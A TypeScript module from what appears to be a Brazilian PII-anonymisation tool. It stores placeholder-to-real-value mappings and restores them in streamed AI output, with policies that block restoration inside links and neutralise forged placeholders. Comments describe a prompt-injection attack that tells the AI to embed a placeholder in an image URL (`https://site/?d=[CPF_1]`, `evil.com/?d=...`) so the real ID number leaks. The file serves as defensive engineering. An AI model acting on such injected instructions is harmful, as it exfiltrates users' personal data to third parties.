// Cofre: mapeamento entre marcadores e dados reais, e restauração (equivalente a veu/vault.py).
import { LABELS, SECRET_LABELS } from "./entities.ts";
import { hmacSha256, toHex } from "./sha256.ts";
import { fold, onlyDigits } from "./text.ts";

/** Rótulos comparados só pelos dígitos ("529.982.247-25" e "52998224725" são o mesmo CPF). */
export const DIGIT_LABELS: ReadonlySet<string> = new Set([
  "CPF", "TELEFONE", "CEP", "CARTAO_CREDITO", "PIS", "CNS", "CNH", "TITULO_ELEITOR", "RENAVAM",
  "CONTA_BANCARIA", "PROCESSO", "NIF_PT", "NISS_PT", "CUIT", "DNI", "NIT", "RUC", "CEDULA",
]);
export const CODE_LABELS: ReadonlySet<string> = new Set(["CNPJ", "RG", "PLACA", "PASSAPORTE", "CHAVE_PIX", "CC_PT", "CURP",
  "RFC", "RUT", "RIF"]);

// O colchete final é opcional: modelos às vezes escrevem "[CPF_1" ou "[CPF 1]".
const PLACEHOLDER = "\\[\\s*(?<ph_label>[A-Za-z]+(?:_[A-Za-z]+)*)[_\\s-]+(?<ph_id>[0-9A-Fa-f]{1,16})(?:\\s*\\]|(?![\\p{L}\\p{N}_]))";
const BARE = "(?<![\\p{L}\\p{N}_\\[])(?<bare_label>[A-Z]+(?:_[A-Z]+)*)_(?<bare_id>\\d{1,6}|[0-9a-f]{16}|[0-9a-f]{8})(?![\\p{L}\\p{N}_\\]])";
const RESTORE = new RegExp(`${PLACEHOLDER}|${BARE}`, "gu");
// Marcadores que já chegam no texto de entrada (escritos por uma página, um e-mail ou um documento).
const FORGED = /\[(?<open>\s*)(?<label>[A-Za-z]+(?:_[A-Za-z]+)*)(?<sep>[_\s-]+)(?<id>[0-9A-Fa-f]{1,16})(?=\s*\]|(?![\p{L}\p{N}_]))/gu;
const TRAILING_WORD = /^[A-Za-z0-9_]+$/;
export const MAX_HOLDBACK = 48;
const HASH_HEX = 16; // 64 bits no operador hash
const HASH_CONTEXT = new TextEncoder().encode("veu/hash/v2");

/**
 * Onde a restauração pode devolver os dados reais (igual ao [restauracao] do veu.toml).
 *
 * - `links` (padrão false): restaura também dentro de links, imagens e URLs. Um texto malicioso lido pela IA
 *   pode pedir que ela escreva `![x](https://site/?d=[CPF_1])`: restaurar ali enviaria o CPF real ao site.
 * - `linkHosts`: domínios (e subdomínios) cujos links podem receber os dados reais mesmo assim.
 * - `tools` (padrão true): restaura os argumentos das chamadas de ferramenta.
 * - `secretsInTools` (padrão false): restaura chaves de API, tokens e senhas nesses argumentos.
 */
export interface RestorePolicy {
  links?: boolean;
  linkHosts?: string[];
  tools?: boolean;
  secretsInTools?: boolean;
}

/** Contexto de uma restauração: argumento de ferramenta e texto da mesma linha que já passou (streaming). */
export interface RestoreContext {
  tool?: boolean;
  prefix?: string;
}

// O último caso é um domínio solto seguido de "/" (evil.com/?d=...), que muitos sites transformam em link.
const URL_START = /\b[a-z][a-z0-9+.-]*:\/\/|\bwww\.|\bmailto:|\]\(\s*<?|(?<![:/\p{L}\p{N}_])\/\/|\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,24}(?::\d{1,5})?\//iu;
const LINK_ATTRIBUTE = /(?:\b(?:src|href|action|formaction|srcset|poster|ping|cite|background|lowsrc|data)\s*=\s*|\burl\(\s*)["']?$/i;
const ANGLE_DESTINATION = /\]\(\s*<[^>\n]*$/;
const RUN = /[^\s"'<>`]*$/u;
const HOST = /^(?:[a-z][a-z0-9+.-]*:)?\/\/([^/?#\\\s]*)[/?#\\]/i;
const JSON_ESCAPE = /\\u([0-9a-fA-F]{4})|\\(\/)/g;

/** Se o marcador está dentro de um link, imagem ou URL, devolve a URL até ele; senão, null. */
export function linkContext(before: string): string | null {
  let line = before.slice(before.lastIndexOf("\n") + 1);
  if (line.includes("\\")) {
    line = line.replace(JSON_ESCAPE, (_, hex: string | undefined) => (hex ? String.fromCharCode(parseInt(hex, 16)) : "/"));
  }
  const angle = ANGLE_DESTINATION.exec(line);
  if (angle) return line.slice(line.indexOf("<", angle.index) + 1);
  const run = RUN.exec(line)![0];
  const start = URL_START.exec(run);
  if (start) return start[0].startsWith("]") ? run.slice(start.index + start[0].length) : run.slice(start.index);
  if (LINK_ATTRIBUTE.test(line.slice(0, line.length - run.length))) return run;
  return null;
}

/** Domínio de uma URL absoluta, só se ele já terminou (vazio se o marcador está no próprio domínio). */
export function urlHost(url: string): string {
  const match = HOST.exec(url);
  if (!match) return "";
  const authority = match[1];
  return authority.slice(authority.lastIndexOf("@") + 1).split(":")[0].toLowerCase().replace(/\.+$/, "");
}

/** A política deixa restaurar um valor do tipo `label`, precedido por `before` (o texto da mesma linha)? */
export function restoreAllowed(policy: RestorePolicy, label: string, before: string, tool: boolean): boolean {
  if (tool && (policy.tools === false || (SECRET_LABELS.has(label) && !policy.secretsInTools))) return false;
  if (policy.links) return true;
  const url = linkContext(before);
  if (url === null) return true;
  const host = urlHost(url);
  return !!host && (policy.linkHosts ?? []).some((domain) => {
    const allowed = domain.trim().toLowerCase().replace(/^\.+/, "");
    return !!allowed && (host === allowed || host.endsWith(`.${allowed}`));
  });
}

/**
 * Desarma marcadores que já vêm no texto de entrada: `[CPF_1]` vira `[CPF#1]`. Só o Véu cria marcadores;
 * um marcador escrito por outra pessoa não pode virar um dado real quando a IA o repete.
 */
export function neutralizePlaceholders(text: string, labels: ReadonlySet<string> = new Set()): string {
  if (!text.includes("[")) return text;
  return text.replace(FORGED, (match, open: string, label: string, sep: string, id: string) => {
    const upper = label.toUpperCase();
    if (!(upper in LABELS) && !labels.has(upper)) return match;
    return `[${open}${label}${"#".repeat(sep.length)}${id}`;
  });
}

export function normalizeValue(label: string, value: string): string {
  if (label === "TELEFONE") {
    const digits = onlyDigits(value);
    return (digits.length === 12 || digits.length === 13) && digits.startsWith("55") ? digits.slice(2) : digits;
  }
  if (DIGIT_LABELS.has(label)) return onlyDigits(value) || fold(value);
  if (CODE_LABELS.has(label)) return value.replace(/[^0-9A-Za-z]/g, "").toUpperCase();
  if (label === "EMAIL") return value.trim().toLowerCase();
  return fold(value);
}

export interface VaultEntry {
  label: string;
  original: string;
  replacement: string;
  kind: "marcador" | "sintetico";
}

/** Formato de exportação, igual ao do Véu em Python (veu anonimizar --cofre). */
export interface VaultData {
  versao: number;
  itens: { entidade: string; original: string; substituto: string; tipo?: string }[];
  chaves?: { entidade: string; valor: string; substituto: string }[];
}

function randomSecret(): Uint8Array {
  const bytes = new Uint8Array(32);
  globalThis.crypto.getRandomValues(bytes);
  return bytes;
}

/** Mapeamento reversível entre dados reais e o que foi enviado ao modelo. Fica só na memória. */
export class Vault {
  private byKey = new Map<string, string>();
  private items = new Map<string, VaultEntry>();
  private counters = new Map<string, number>();
  private secret: Uint8Array;
  readonly policy: RestorePolicy;

  constructor(secret?: Uint8Array | string, policy: RestorePolicy = {}) {
    this.secret = typeof secret === "string" ? new TextEncoder().encode(secret) : secret ?? randomSecret();
    this.policy = policy;
  }

  private static key(label: string, normalized: string): string {
    return `${label}\u0000${normalized}`;
  }

  lookup(label: string, value: string): string | undefined {
    return this.byKey.get(Vault.key(label, normalizeValue(label, value)));
  }

  placeholder(label: string, value: string, hashed = false): string {
    const normalized = normalizeValue(label, value);
    const key = Vault.key(label, normalized);
    const existing = this.byKey.get(key);
    if (existing !== undefined) return existing;
    let replacement: string;
    if (hashed) {
      replacement = `[${label}_${this.hashId(label, normalized)}]`;
      // Colisão de 64 bits: improvável, mas nunca troca uma pessoa por outra.
      if (this.items.has(replacement)) throw new Error(`Colisão no operador hash para ${label}. Use outro segredo.`);
    } else {
      const next = (this.counters.get(label) ?? 0) + 1;
      this.counters.set(label, next);
      replacement = `[${label}_${next}]`;
    }
    this.store(key, { label, original: value, replacement, kind: "marcador" });
    return replacement;
  }

  /** HMAC-SHA256 com uma chave derivada só para o operador hash (64 bits na saída). */
  hashId(label: string, normalized: string): string {
    const key = hmacSha256(this.secret, HASH_CONTEXT);
    return toHex(hmacSha256(key, new TextEncoder().encode(`${label}:${normalized}`))).slice(0, HASH_HEX);
  }

  /** Faz outro valor (por exemplo, só o primeiro nome) usar um marcador já existente. */
  alias(label: string, value: string, replacement: string): void {
    const key = Vault.key(label, normalizeValue(label, value));
    if (!this.byKey.has(key)) this.byKey.set(key, replacement);
  }

  private store(key: string, entry: VaultEntry): void {
    this.byKey.set(key, entry.replacement);
    this.items.set(entry.replacement, entry);
  }

  get size(): number {
    return this.items.size;
  }

  entries(): VaultEntry[] {
    return [...this.items.values()];
  }

  get labels(): Set<string> {
    return new Set([...this.items.values()].map((entry) => entry.label));
  }

  get hasPlaceholders(): boolean {
    return [...this.items.values()].some((entry) => entry.kind === "marcador");
  }

  private entryFor(groups: Record<string, string | undefined>): VaultEntry | undefined {
    const key = groups.ph_label
      ? `[${groups.ph_label.toUpperCase()}_${groups.ph_id!.toLowerCase()}]`
      : `[${groups.bare_label}_${groups.bare_id}]`;
    const entry = this.items.get(key);
    return entry && entry.kind === "marcador" ? entry : undefined;
  }

  /**
   * Troca os marcadores pelos valores reais, seguindo a política do cofre.
   * jsonEscape: o texto é um pedaço de JSON. `context.tool` (padrão: igual a jsonEscape): argumento de ferramenta.
   * Dentro de links e URLs, e para segredos em argumentos de ferramentas, o marcador fica como está.
   */
  restore(text: string, jsonEscape = false, context: RestoreContext = {}): string {
    if (!text || !this.items.size) return text;
    const tool = context.tool ?? jsonEscape;
    const prefix = context.prefix ?? "";
    // O último caractere já emitido (streaming) entra só como contexto: "_" + "CPF_1" não é um marcador solto.
    const lead = prefix.slice(-1);
    return (lead + text).replace(RESTORE, (...args) => {
      const groups = args[args.length - 1] as Record<string, string | undefined>;
      const match = args[0] as string;
      if ((args[args.length - 3] as number) < lead.length) return match;
      const offset = (args[args.length - 3] as number) - lead.length;
      const entry = this.entryFor(groups);
      if (!entry) return match;
      const newline = offset > 0 ? text.lastIndexOf("\n", offset - 1) : -1;
      const before = newline === -1 ? prefix + text.slice(0, offset) : text.slice(newline + 1, offset);
      if (!restoreAllowed(this.policy, entry.label, before, tool)) return match;
      return jsonEscape ? JSON.stringify(entry.original).slice(1, -1) : entry.original;
    }).slice(lead.length);
  }

  restorer(jsonEscape = false, tool?: boolean): StreamRestorer {
    return new StreamRestorer(this, jsonEscape, tool);
  }

  /** O fim do texto pode ser o começo de um marcador que chega no próximo pedaço? */
  mightContinue(tail: string): boolean {
    if (!TRAILING_WORD.test(tail)) return false;
    const upper = tail.toUpperCase();
    for (const label of this.labels) {
      const prefix = `${label}_`;
      if (prefix.startsWith(upper) || upper.startsWith(prefix)) return true;
    }
    return false;
  }

  /** O arquivo exportado contém os dados reais: guarde com cuidado. */
  toJSON(): VaultData {
    return {
      versao: 1,
      itens: this.entries().map((e) => ({ entidade: e.label, original: e.original, substituto: e.replacement, tipo: e.kind })),
      chaves: [...this.byKey.entries()].map(([key, substituto]) => {
        const [entidade, valor] = key.split("\u0000");
        return { entidade, valor, substituto };
      }),
    };
  }

  static fromJSON(data: VaultData, secret?: Uint8Array | string, policy: RestorePolicy = {}): Vault {
    const vault = new Vault(secret, policy);
    for (const item of data.itens ?? []) {
      const entry: VaultEntry = {
        label: item.entidade, original: item.original, replacement: item.substituto,
        kind: item.tipo === "sintetico" ? "sintetico" : "marcador",
      };
      vault.store(Vault.key(entry.label, normalizeValue(entry.label, entry.original)), entry);
      const match = /^\[[A-Z_]+_(\d+)\]$/.exec(entry.replacement);
      if (match) vault.counters.set(entry.label, Math.max(vault.counters.get(entry.label) ?? 0, Number(match[1])));
    }
    for (const item of data.chaves ?? []) {
      const key = Vault.key(item.entidade, item.valor);
      if (!vault.byKey.has(key)) vault.byKey.set(key, item.substituto);
    }
    return vault;
  }
}

/** Restaura uma resposta que chega em pedaços: um marcador dividido ("[PES" + "SOA_1]") fica retido até completar. */
export class StreamRestorer {
  private buffer = "";
  // Texto já emitido na linha atual: um link pode começar num pedaço e o marcador chegar em outro.
  private line = "";
  readonly vault: Vault;
  readonly jsonEscape: boolean;
  readonly tool: boolean;

  constructor(vault: Vault, jsonEscape = false, tool?: boolean) {
    this.vault = vault;
    this.jsonEscape = jsonEscape;
    this.tool = tool ?? jsonEscape;
  }

  private emit(ready: string): string {
    const output = this.vault.restore(ready, this.jsonEscape, { tool: this.tool, prefix: this.line });
    const newline = ready.lastIndexOf("\n");
    this.line = newline === -1 ? this.line + ready : ready.slice(newline + 1);
    return output;
  }

  feed(text: string): string {
    if (!text) return "";
    this.buffer += text;
    const cut = this.safeCut(this.buffer);
    const ready = this.buffer.slice(0, cut);
    this.buffer = this.buffer.slice(cut);
    return this.emit(ready);
  }

  flush(): string {
    const ready = this.buffer;
    this.buffer = "";
    return this.emit(ready);
  }

  get pending(): boolean {
    return this.buffer.length > 0;
  }

  private safeCut(text: string): number {
    let cut = text.length;
    const bracket = text.lastIndexOf("[");
    if (bracket !== -1 && !text.slice(bracket).includes("]") && text.length - bracket <= MAX_HOLDBACK) cut = bracket;
    const longest = Math.min(text.length, MAX_HOLDBACK);
    // No meio de uma palavra ("_CPF_1"), um marcador solto não começa: cortar ali o separaria do contexto.
    const word = /[\p{L}\p{N}_]/u;
    for (let size = longest; size > 0; size -= 1) {
      const start = text.length - size;
      if (start >= cut) break;
      if (start > 0 && word.test(text[start - 1]) && word.test(text[start])) continue;
      if (this.vault.mightContinue(text.slice(start))) {
        cut = start;
        break;
      }
    }
    return cut;
  }
}
